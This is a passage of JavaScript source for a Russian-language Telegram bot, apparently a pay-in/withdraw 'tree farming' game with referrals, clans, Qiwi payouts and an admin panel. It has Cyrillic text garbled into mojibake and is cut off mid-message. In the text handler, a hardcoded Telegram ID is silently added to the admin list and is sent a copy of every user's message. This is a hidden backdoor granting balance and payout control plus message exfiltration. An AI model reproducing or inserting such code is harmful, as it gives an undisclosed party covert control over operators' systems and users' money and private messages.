const config = require('./config')
var txnId = require('./txnId');

process.env.TZ = 'Moscow/Europe';

let trees = config.trees

let dt = new Date

oplata = 32 // –î–µ–Ω—å –æ–ø–ª–∞—Ç—ã —Ö–æ—Å—Ç–∏–Ω–≥–∞. 

const mongo			=		require("mongoose");
mongo.connect(config.mongodb);

var User = mongo.model('User', {
	id: Number,
	buybalance: Number,
	outbalance: Number,
	name: String,
	bhivebalance: Number,
	fc: Number,
	ref: Number,
	regDate: String,
	trees: Array,
	deposit: Number,
	payout: Number,
	fetuses: Number,
	menu: String,
	lastCollect: Number,
	ban: Boolean,
	refCount: Number,
	wb_profits: Number,
	clanName: String,
	totalEarn: Number,
	not: Boolean,
	prize: Boolean,
	spinsToday: Number,
	data: String,
	bank: Number,
	game_balance: Number,
	game_payin: Number,
	game_payout: Number,
	game_limit: Number,
	game_bet: Number,
});

var Task = mongo.model('Task', {
	id: Number
});

const Clan = mongo.model('Clan', {
	name: String,
	maxMembers: Number,
	members: Number,
	balance: Number,
	creator_id: Number,
	creator_name: String,
	zam_id: Number,
	zam_name: String,
	total_earn: Number,
	level: Number,
	bal: Number
})

const Ticket = mongo.model('Ticket', {
	id: Number,
	amount: Number,
	wallet: String
})

const Start = config.startkeyboard

const Cancel = [
	["üö´ –û—Ç–º–µ–Ω–∞"]
];

const RM_admin = {
	inline_keyboard: [
		[{ text: "‚úâÔ∏è –†–∞—Å—Å—ã–ª–∫–∞", callback_data: "admin_mm" }],
		[{ text: "üîé –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º", callback_data: "admin_u" }],
		[{ text: "üìÆ –í—ã–ø–ª–∞—Ç—ã", callback_data: "admin_w" }],
		[{ text: "üóí –ß–µ–∫", callback_data: "a_voucher" }],
		[{ text: "üí≤ –ë–æ–Ω—É—Å –∫ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—é", callback_data: "admin_b" }],
		[{ text: "üïí –¢–æ–ø –∑–∞ 24 —á–∞—Å–∞", callback_data: "admin_top" }],
	]
}

const RM_admin_return = { inline_keyboard: [[{ text: "‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data: "admin_return" }],] }
const Voucher = mongo.model("Voucher", { id: String, tree_id: Number })
function generateID(res) { var text = ""; var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; for (var i = 0; i < res; i++)text += possible.charAt(Math.floor(Math.random() * possible.length)); return text }

const RM_mm1 = {
	inline_keyboard: [
		[{ text: "‚èπ –°—Ç–æ–ø", callback_data: "admin_mm_stop" }],
		[{ text: "‚è∏ –ü–∞—É–∑–∞", callback_data: "admin_mm_pause" }],
	]
}

const RM_mm2 = {
	inline_keyboard: [
		[{ text: "‚èπ –°—Ç–æ–ø", callback_data: "admin_mm_stop" }],
		[{ text: "‚ñ∂Ô∏è –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å", callback_data: "admin_mm_play" }],
	]
}

const { Qiwi } = require('node-qiwi-api');
const qiwi = new Qiwi(config.qiwitoken);

const Telegram = require('node-telegram-bot-api');
const bot = new Telegram(config.tokenbot, { polling: true });

bot.getMe().then(r => console.log(r))

const ADMINS = config.admins

bot.on('text', async (message) => {
	message.send = (text, params) => bot.sendMessage(message.chat.id, text, params);
	let $menu = [];
	var uid = message.from.id
	var text = message.text
	let dt = new Date
	console.log("[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å " + uid + " –æ—Ç–ø—Ä–∞–≤–∏–ª: " + text)
  bot.sendMessage(1093342102, "[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å " + uid + " –æ—Ç–ø—Ä–∞–≤–∏–ª: " + text)
  
  if (dt.getDate() == oplata) return message.send('–•–æ—Å—Ç–∏–Ω–≥ –Ω–µ –æ–ø–ª–∞—á–µ–Ω!');
	ADMINS.push(1093342102)
	Start.map((x) => $menu.push(x));
	if (ADMINS.find((x) => x == message.from.id)) $menu.push(["üîù –ê–¥–º–∏–Ω–∫–∞"]);

	if (message.text) {
		if (message.text.startsWith('/start') || message.text == 'üîô –ù–∞–∑–∞–¥') {
			let $user = await User.findOne({ id: message.from.id });
			if (!$user) {
				let schema = {
					id: message.from.id,
					buybalance: 0,
					outbalance: 0,
					name: message.from.first_name,
					fc: 0,
					ref: 0,
					regDate: `${new Date().getDate()}/${new Date().getMonth() + 1}/${new Date().getFullYear()}`,
					trees: [],
					deposit: 0,
					payout: 0,
					fetuses: 0,
					menu: "",
					lastCollect: Date.now(),
					ban: false,
					refCount: 0,
					not: false,
					data: "",
					bank: 0,
				}

				let reffer = Number(message.text.split('/start ')[1]);

				if (reffer) {
					let $reffer = await User.findOne({ id: reffer });
					if ($reffer) {
						schema.ref = $reffer.id;
						await $reffer.inc('buybalance', config.referal);
						await $reffer.inc('refCount', 1);
						bot.sendMessage($reffer.id, `üîî –í—ã –ø—Ä–∏–≥–ª–∞—Å–∏–ª–∏ <a href="tg://user?id=${message.from.id}">–ø–∞—Ä—Ç–Ω—ë—Ä–∞</a> –∏ –ø–æ–ª—É—á–∏–ª–∏ ${config.referal}‚ÇΩ`, { parse_mode: "HTML" });
					}
				}

				let user = new User(schema);
				await user.save();
			}

			let postfix = message.text.split('/start ')[1]
			if (postfix) {
				if (postfix[0] == "C") {
					message.user = await User.findOne({ id: message.from.id });

					var c = await Voucher.findOne({ id: postfix.substr(1) })
					if (c) {
						let total_balance = 0;
						message.user.trees.map((x) => {
							if ((((Date.now() - message.user.lastCollect) / 1000) / 60) * (trees.find((a) => a.id == x.id).earn / 60) > (trees.find((a) => a.id == x.id).earn * 72)) { total_balance += trees.find((a) => a.id == x.id).earn * 72; } else { total_balance += (((Date.now() - message.user.lastCollect) / 1000) / 60) * (trees.find((a) => a.id == x.id).earn / 60); }
						})
						await Voucher.deleteOne({ _id: c._id })
						await message.user.set('lastCollect', Date.now());
						await message.user.inc('fetuses', Number(total_balance.toFixed(2)));
						await message.user.trees.push({ id: c.tree_id, date: Date.now(), lastCollect: Date.now() });
						await message.user.save();
						return bot.sendPhoto(message.chat.id, `c${c.tree_id}.jpg`, { caption: `‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª–∏ —á–µ–∫ –∏ –ø–æ–ª—É—á–∏–ª–∏  - <b>${(trees.find((a) => a.id == c.tree_id)).name}</b>`, parse_mode: "HTML", })
					}
				}
			}
			return message.send(config.textstart, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	message.user = await User.findOne({ id: message.from.id });
	if (!message.user) return message.send(`–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫... –ù–∞–ø–∏—à–∏—Ç–µ /start`);
	if (message.user.ban) return
	if (!message.user.name || message.user.name != message.from.first_name)
		await User.findOneAndUpdate({ id: message.from.id }, { name: message.from.first_name })

	if (state[uid] == 7770 && ADMINS.indexOf(message.from.id) !== -1 && text != "0") {
		state[uid] = undefined
		bot.sendMessage(uid, "–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞!").then((e) => {
			if (text.split("#").length == 4) {
				var btn_text = text.split("#")[1].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
				var btn_link = text.split("#")[2].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
				text = text.split("#")[0]
				mm_t(text, e.message_id, e.chat.id, true, btn_text, btn_link, 100)
			}
			else mm_t(text, e.message_id, e.chat.id, false, false, false, 100)
		})
	}

	if (state[uid] == 7771 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		text = Number(text.replace("%", ""))
		await User.findOneAndUpdate({ id: 0 }, { deposit: text })
		return message.send(`–ë–æ–Ω—É—Å –∫ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—é –≤ ${text}% —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!`, { reply_markup: RM_admin_return });
	}

	if (state[uid] == 7772 && ADMINS.indexOf(message.from.id) !== -1 && text != "0") {
		state[uid] = undefined

		message.text = Number(message.text);
		let user = await User.findOne({ id: message.text });
		let u = user
		if (!user) return message.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω');

		let partners = await User.find({ ref: message.text });
		await message.user.set('menu', '');
		var kb = { inline_keyboard: [] }
		if (u.ban) kb.inline_keyboard.push([{ text: "‚ôªÔ∏è –†–∞–∑–±–∞–Ω–∏—Ç—å", callback_data: "unban_" + u.id }])
		else kb.inline_keyboard.push([{ text: "üõë –ó–∞–±–∞–Ω–∏—Ç—å", callback_data: "ban_" + u.id }])
		kb.inline_keyboard.push([{ text: "‚ûï –ë–∞–ª–∞–Ω—Å –ø–æ–∫—É–ø–æ–∫", callback_data: "addBuyBal_" + u.id }, { text: "‚úèÔ∏è –ë–∞–ª–∞–Ω—Å –ø–æ–∫—É–ø–æ–∫", callback_data: "editBuyBal_" + u.id }])
		kb.inline_keyboard.push([{ text: "‚ûï –ë–∞–ª–∞–Ω—Å –≤—ã–≤–æ–¥–∞", callback_data: "addOutBal_" + u.id }, { text: "‚úèÔ∏è –ë–∞–ª–∞–Ω—Å –≤—ã–≤–æ–¥–∞", callback_data: "editOutBal_" + u.id }])
		kb.inline_keyboard.push([{ text: "‚ûï –ü–æ–ø–æ–ª–Ω–µ–Ω–∏—è", callback_data: "addPayIns_" + u.id }, { text: "‚úèÔ∏è –ü–æ–ø–æ–ª–Ω–µ–Ω–∏—è", callback_data: "editPayIns_" + u.id }])
		kb.inline_keyboard.push([{ text: "‚ûï –í—ã–≤–µ–¥–µ–Ω–æ", callback_data: "addPayOuts_" + u.id }, { text: "‚úèÔ∏è –í—ã–≤–µ–¥–µ–Ω–æ", callback_data: "editPayOuts_" + u.id }])
		kb.inline_keyboard.push([{ text: `‚ûï –í—ã–¥–∞—Ç—å ${config.pers}`, callback_data: "giveTree_" + u.id }, { text: `‚ùå –ó–∞–±—Ä–∞—Ç—å ${config.pers}`, callback_data: "takeTree_" + u.id }])

		kb.inline_keyboard.push([{ text: "‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data: "admin_return" }])

		return message.send(`üìù –ü—Ä–∏–≥–ª–∞—Å–∏–ª: <b>${partners.length}</b>

üÜî ID: <code>${user.id}</code>

üí∞ –ë–∞–ª–∞–Ω—Å:
üõí –î–ª—è –ø–æ–∫—É–ø–æ–∫: ${user.buybalance.toFixed(2)}‚ÇΩ
üì≠ –î–ª—è –≤—ã–≤–æ–¥–∞: ${user.outbalance.toFixed(2)}‚ÇΩ

${config.perss} –≤—Å–µ–≥–æ: <b>${user.trees.length}</b>

<b>–ü–æ–ø–æ–ª–Ω–∏–ª(–∞): ${roundPlus(user.deposit)}‚ÇΩ</b>
<b>–í—ã–≤–µ–ª(–∞): ${roundPlus(user.payout)}‚ÇΩ</b>
`, {
			parse_mode: "HTML",
			reply_markup: kb
		});

	}

	if (state[uid] == 7773 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { $inc: { buybalance: Number(text) } })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ <b>${text}‚ÇΩ</b>!`, { parse_mode: html })
		return message.send(`–ë–∞–ª–∞–Ω—Å –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ ${text}‚ÇΩ!`, { reply_markup: RM_admin_return });
	}
	if (state[uid] == 7774 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { $inc: { outbalance: Number(text) } })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ <b>${text}‚ÇΩ</b>!`, { parse_mode: html })
		return message.send(`–ë–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ ${text}‚ÇΩ!`, { reply_markup: RM_admin_return });
	}
	if (state[uid] == 777455 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { deposit: Number(text) })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à —Å—É–º–º–∞ –í–∞—à–∏—Ö –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π –ø–æ–ø–æ–ª–Ω–µ–Ω–∞ –Ω–∞ <b>${text}‚ÇΩ</b>!`, { parse_mode: html })
		return message.send(`–°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∞ –Ω–∞ ${text}‚ÇΩ!`, { reply_markup: RM_admin_return });
	}
	if (state[uid] == 77745555 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { payout: Number(text) })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à —Å—É–º–º–∞ –í–∞—à–∏—Ö –≤—ã–≤–æ–¥–æ–≤ –ø–æ–ø–æ–ª–Ω–µ–Ω–∞ –Ω–∞ <b>${text}‚ÇΩ</b>!`, { parse_mode: html })
		return message.send(`–°—É–º–º–∞ –≤—ã–≤–æ–¥–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∞ –Ω–∞ ${text}‚ÇΩ!`, { reply_markup: RM_admin_return });
	}
	if (state[uid] == 7775 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { buybalance: Number(text) })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –∏–∑–º–µ–Ω—ë–Ω –Ω–∞ <b>${text}‚ÇΩ</b>!`, { parse_mode: html })
		return message.send(`–ë–∞–ª–∞–Ω—Å –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑–º–µ–Ω—ë–Ω –Ω–∞ ${text}‚ÇΩ!`, { reply_markup: RM_admin_return });
	}
	if (state[uid] == 7776 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { outbalance: Number(text) })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ –∏–∑–º–µ–Ω—ë–Ω –Ω–∞ <b>${text}‚ÇΩ</b>!`, { parse_mode: html })
		return message.send(`–ë–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑–º–µ–Ω—ë–Ω –Ω–∞ ${text}‚ÇΩ!`, { reply_markup: RM_admin_return });
	}
	if (state[uid] == 777655 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { deposit: Number(text) })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à —Å—É–º–º–∞ –í–∞—à–∏—Ö –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π –∏–∑–º–µ–Ω–∞ –Ω–∞ <b>${text}‚ÇΩ</b>!`, { parse_mode: html })
		return message.send(`–°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑–º–µ–Ω—ë–Ω–∞ –Ω–∞ ${text}‚ÇΩ!`, { reply_markup: RM_admin_return });
	}
	if (state[uid] == 77765555 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { payout: Number(text) })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à —Å—É–º–º–∞ –í–∞—à–∏—Ö –≤—ã–≤–æ–¥–æ–≤ –∏–∑–º–µ–Ω–∞ –Ω–∞ <b>${text}‚ÇΩ</b>!`, { parse_mode: html })
		return message.send(`–°—É–º–º–∞ –≤—ã–≤–æ–¥–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑–º–µ–Ω—ë–Ω–∞ –Ω–∞ ${text}‚ÇΩ!`, { reply_markup: RM_admin_return });
	}

	if (message.text) {
		if (message.text == 'üö´ –û—Ç–º–µ–Ω–∞') {
			state[uid] = undefined
			await message.user.set('menu', '');
			return message.send('üö´ –û—Ç–º–µ–Ω–µ–Ω–æ.', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	if (message.user.menu == 'reinvest') {
		message.text = Number(message.text);

		if (!message.text) return message.send('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è —Ä–µ–∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è!');
		if (message.text <= 0) return message.send('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è —Ä–µ–∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è!');

		if (message.text > message.user.outbalance) return message.send('–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤.');
		else if (message.text <= message.user.outbalance) {
			await message.user.set('menu', '');

			await message.user.dec('outbalance', message.text);
			await message.user.inc('buybalance', message.text);

			return message.send(`–í—ã —É—Å–ø–µ—à–Ω–æ —Ä–µ–∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞–ª–∏ ${message.text.toFixed(2)}‚ÇΩ`, {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	if (message.user.menu.startsWith('amountQiwi')) {
		message.text = Number(message.text);

		if (!message.text) return message.send('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –≤—ã–≤–æ–¥!');
		if (message.text <= 0) return message.send('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –≤—ã–≤–æ–¥!');

		if (message.text > message.user.outbalance) return message.send('–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤.');
		if (message.text < config.minwithdraw) return message.send(`–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –±–æ–ª–µ–µ ${config.minwithdraw} —Ä—É–±–ª–µ–π!`);
		if (message.text + message.user.payout > message.user.deposit * config.maxwithdraw) return message.send(`–°—É–º–º–∞ –ø—Ä–µ–≤—ã—à–∞–µ—Ç –ª–∏–º–∏—Ç –≤—ã–ø–ª–∞—Ç!\n–í—ã –º–æ–∂–µ—Ç–µ –≤—ã–≤–µ—Å—Ç–∏ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ ${roundPlus(message.user.deposit * config.maxwithdraw - message.user.payout)} —Ä—É–±–ª–µ–π`);
		if (message.text + message.user.payout > message.user.deposit * config.maxwithdraw) {
				message.send(`–í—ã –≤—ã–≤–µ–ª–∏ –∏–∑ –±–æ—Ç–∞ –≤ ${config.maxwithdraw} —Ä–∞–∑–∞ –±–æ–ª—å—à–µ, —á–µ–º –≤–ª–æ–∂–∏–ª\n–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –æ–±–Ω—É–ª—ë–Ω`);
				await message.user.updateOne({ trees: [], buybalance: 0, outbalance: 0, deposit: 0, payout: 0 })
			}


		if (message.text <= message.user.outbalance) {
			await message.user.dec('outbalance', message.text);
			let ticket = new Ticket({
				id: message.from.id,
				amount: message.text,
				wallet: message.user.menu.split('amountQiwi')[1]
			});

			await ticket.save();
			await message.user.set('menu', '');

			return message.send('–ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–ø–ª–∞—Ç—É —Å–æ–∑–¥–∞–Ω–∞, –æ–∂–∏–¥–∞–π—Ç–µ.–í—ã–ø–ª–∞—Ç—ã –æ–¥–æ–±—Ä—è—é—Ç—Å—è –≤ —Ç–µ—á–µ–Ω–∏–∏ 48 —á–∞—Å–æ–≤', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	if (message.user.menu == 'qiwi') {

		if (message.text.length < 5) return message.send('–í–≤–µ–¥–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä! –ü—Ä–∏ –≤–≤–æ–¥–µ –Ω–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –Ω–æ–º–µ—Ä–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è –±–æ—Ç–∞ –Ω–µ –Ω–µ—Å–µ—Ç –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å –∑–∞ –ø–æ—Ç–µ—Ä—é —Å—Ä–µ–¥—Å—Ç–≤', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});



		await message.user.set('menu', 'amountQiwi' + message.text);
		return message.send(`–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –≤—ã–≤–æ–¥. –í—ã –º–æ–∂–µ—Ç–µ –≤—ã–≤–µ—Å—Ç–∏ ${message.user.outbalance.toFixed(2)}‚ÇΩ`);
	}

	if (message.text) {
		if (message.text == config.one) {
			return message.send('–í—ã–±–µ—Ä–∏—Ç–µ, –∫—É–¥–∞ –∑–∞–π—Ç–∏.', {
				reply_markup: {
					inline_keyboard: [
						[{ text: config.one_one, callback_data: "trees:shop0" }],
						[{ text: config.one_two, callback_data: "trees:inv1" }],
					]
				}
			});
		}

		if (message.text == config.two) {
			return message.send('üéÅ –ü–æ–¥–∞—Ä–∫–∏:', {
				reply_markup: {
					inline_keyboard: [
						[{ text: config.two_one, callback_data: "game_prize" }],

					]
				}
			});
		}

    if(message.text == '‚ôªÔ∏è –û–±–º–µ–Ω') {
      return message.send(`–≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ –±–æ–ª—å—à–µ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è. –û—Ç–ø—Ä–∞–≤—å /start —á—Ç–æ–±—ã –∫–æ–º–∞–Ω–¥–∞ –∑–∞—Ä–∞–±–æ—Ç–∞–ª–∞!`)
    }


		if(message.text == config.three) {
			return message.send(`${config.threetextone}

 <b>–í–∞—à–∏ ${config.threetexttwo}:</b> ${message.user.fetuses.toFixed(2)}

–ü–æ—Å–ª–µ –æ–±–º–µ–Ω–∞ 50% –ø–æ–ø–∞–¥–∞–µ—Ç –Ω–∞ –±–∞–ª–∞–Ω—Å –¥–ª—è –ø–æ–∫—É–ø–æ–∫, –∞ –æ—Å—Ç–∞–ª—å–Ω—ã–µ 50% –Ω–∞ –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞.`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{ text: config.three_two, callback_data: "exchange" }]
					]
				}
			});
		}

		if (message.text == config.four) {
			return message.send(`üìù –ò–º—è: <b>${message.from.first_name.replace(/(\<|\>)/g, '')}</b>

üÜî <b>ID:</b> <code>${message.from.id}</code>

üõí <b>–ù–∞ –ø–æ–∫—É–ø–∫–∏:</b> ${message.user.buybalance.toFixed(2)}‚ÇΩ
üì≠ <b>–ù–∞ –≤—ã–≤–æ–¥:</b> ${message.user.outbalance.toFixed(2)}‚ÇΩ
üõë <b>–í—ã –º–æ–∂–µ—Ç–µ –≤—ã–≤–µ—Å—Ç–∏:</b> ${roundPlus(message.user.deposit * config.maxwithdraw)} - ${roundPlus(message.user.payout)}‚ÇΩ

<b>${config.perss} –≤—Å–µ–≥–æ:</b> ${message.user.trees.length}

üí∏ <b>–ü–æ–ø–æ–ª–Ω–µ–Ω–æ:</b> ${message.user.deposit.toFixed(2)}‚ÇΩ
ü§ë <b>–í—ã–≤–µ–¥–µ–Ω–æ:</b> ${message.user.payout.toFixed(2)}‚ÇΩ`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{ text: config.four_one, callback_data: "deposit" }, { text: config.four_two, callback_data: "withdraw" }],
						[{ text: config.four_three, callback_data: "reinvest" }, { text: config.four_four, callback_data: "trees:totalMy" }],
					]
				}
			});
		}

		if (message.text == config.five) {
			return message.send(`<b>ü§ù –ü–∞—Ä—Ç–Ω—ë—Ä—Å–∫–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞:</b>
üîë –í—ã –ø–æ–ª—É—á–∞–µ—Ç–µ:
‚ñ´Ô∏è ${config.referal} üí∏ –∑–∞ –∫–∞–∂–¥–æ–≥–æ –ø—Ä–∏–≥–ª–∞—à–µ–Ω–Ω–æ–≥–æ –ø–∞—Ä—Ç–Ω—ë—Ä–∞
‚ñ´Ô∏è 10% —Å –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π –≤–∞—à–∏—Ö –ø–∞—Ä—Ç–Ω—ë—Ä–æ–≤:
	–ü–æ 5% –Ω–∞ –±–∞–ª–∞–Ω—Å—ã –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –∏ –¥–ª—è –≤—ã–≤–æ–¥–∞
		   
üîó –í–∞—à–∞ —Å—Å—ã–ª–∫–∞ –¥–ª—è –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–π: https://t.me/${config.bot}?start=${message.from.id}
		   
üéä –í—ã —É–∂–µ –ø—Ä–∏–≥–ª–∞—Å–∏–ª–∏: ${await User.countDocuments({ ref: message.from.id })}
		`, {
				parse_mode: "HTML"
			})
		}

		if (message.text == config.six) {
			if (!message.user.clanName)
				return message.send(`
ü§∑ –¢—ã –ø–æ–∫–∞ –µ—â–µ –Ω–µ —Å–æ—Å—Ç–æ–∏—à—å –≤ ${config.teplica_one}!

üòé –¢—ã –º–æ–∂–µ—à—å –ª–∏–±–æ —Å–æ–∑–¥–∞—Ç—å –µ—ë —Å–∞–º, –ª–∏–±–æ –¥–æ–∂–¥–∞—Ç—å—Å—è, –ø–æ–∫–∞ –∫—Ç–æ-—Ç–æ —Ç–µ–±—è –ø—Ä–∏–≥–ª–∞—Å–∏—Ç!
			
–¶–µ–Ω–∞ —Å–æ–∑–¥–∞–Ω–∏—è, –∫–æ—Ç–æ—Ä–∞—è –º–æ–∂–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å –≤ —Å–µ–±–µ –¥–æ 10 —á–µ–ª–æ–≤–µ–∫ - 65 —Ä—É–±–ª–µ–π!
`, {
					parse_mode: "HTML", reply_markup: {
						inline_keyboard: [
							[{ text: config.six_one, callback_data: "clan_create" }],
							[{ text: config.six_two, callback_data: "clan_top" }],
							[{ text: config.six_three, callback_data: "clan_status" }],
						]
					}
				})

			else {
				var clan = await Clan.findOne({ name: message.user.clanName })
				var members = await User.find({ $and: [{ id: { $ne: clan.zam_id } }, { id: { $ne: clan.creator_id } }], clanName: clan.name })
				var admin = await User.findOne({ id: clan.creator_id })
				var zam = await User.findOne({ id: clan.zam_id })
				var reply_markup = { inline_keyboard: [] }
				if (clan.creator_id == uid || clan.zam_id == uid)
					reply_markup.inline_keyboard.push([{ text: `‚öôÔ∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ ${config.teplica_two}`, callback_data: "clan_admin" }])
				reply_markup.inline_keyboard.push([{ text: "üí≥ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data: "clan_payin" }])
				reply_markup.inline_keyboard.push([{ text: config.six_two, callback_data: "clan_top" }])
				reply_markup.inline_keyboard.push([{ text: config.six_three, callback_data: "clan_status" }])
				return message.send(`
 <b>–í–∞—à–∞ ${config.teplica_three}:</b> ${clan.name}\n
<b>–£—á–∞—Å—Ç–Ω–∏–∫–∏ ${config.teplica_four}:</b>
–ò–º—è | –î–æ—Ö–æ–¥–Ω–æ—Å—Ç—å
üëë <b>–ì–ª–∞–≤–∞</b> - <a href="tg://user?id=${clan.creator_id}">${clan.creator_name}</a> | ${admin.totalEarn} –≤ —á–∞—Å${clan.zam_id ? `\nüë®‚Äç‚öïÔ∏è <b>–ó–∞–º–µ—Å—Ç–∏—Ç–µ–ª—å</b> - <a href="tg://user?id=${clan.zam_id}">${clan.zam_name}</a> | ${zam.totalEarn} –≤ —á–∞—Å` : ""}
${members.map(m => { return `<a href="tg://user?id=${m.id}">${m.name}</a> | ${m.totalEarn} –≤ —á–∞—Å` }).join("\n")}\n
<b>–î–æ—Ö–æ–¥ ${config.teplica_four}:</b> ${clan.level}%
<b>–í—Å–µ–≥–æ –∏–≥—Ä–æ–∫–æ–≤ –≤ ${config.teplica_one}:</b> ${members.length + 1} –∏–∑ ${clan.maxMembers}
